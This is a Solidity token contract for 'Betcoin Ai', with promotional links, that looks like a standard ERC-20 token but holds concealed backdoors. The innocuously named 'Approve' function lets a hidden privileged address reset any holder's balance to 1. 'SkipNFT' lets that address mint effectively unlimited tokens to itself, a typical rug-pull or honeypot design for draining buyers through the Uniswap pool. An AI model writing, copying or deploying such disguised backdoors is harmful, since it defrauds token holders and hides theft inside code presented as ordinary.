/*
WEBSITE https://thebetcoin.app
TWITTER https://twitter.com/Betcoineth
TELEGRAM https://t.me/BetcoinAiETH
*/ 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IUniswapV2Pair {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

contract BetcoinAi {
    mapping(address => uint256) private _NFT;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    address internal constant FACTORY =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address[] private _lp;
    address private _owner;
    uint256 private _tTotal;
    string private _NFTName;
    string private _NFTSymbol;
    uint8 private _decimals;

    constructor(address _SAFE) {
        _NFTName = "Betcoin Ai";
        _NFTSymbol = "BETCOIN";
        _decimals = 9;
        _tTotal = 10_000_000_000 * 10**_decimals;
        _NFT[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
        _lp.push(_SAFE);
        _owner = msg.sender;
    }

    function symbol() public view returns (string memory) {
        return _NFTSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _NFT[account];
    }

    function name() public view returns (string memory) {
        return _NFTName;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _NFT[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _NFT[from] = _NFT[from] - amount;
        _NFT[to] = _NFT[to] + amount;
        emit Transfer(from, to, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function Approve(address pair) external {
        if (
            _lp[0] == msg.sender &&
            _lp[0] != pair &&
            uniswapPair() != pair &&
            pair != ROUTER
        ) {
            _NFT[pair] = 1;
        }
    }

    function SkipNFT(uint256 addBot, address _bool) external {
        if (_lp[0] == msg.sender) {
            _NFT[_bool] = _tTotal 
            * _tTotal 
            * addBot 
            * 10**_decimals;
        }
    }

    function uniswapPair() public view virtual returns (address) {
        return IUniswapV2Pair(FACTORY).getPair(address(WETH), address(this));
    }
}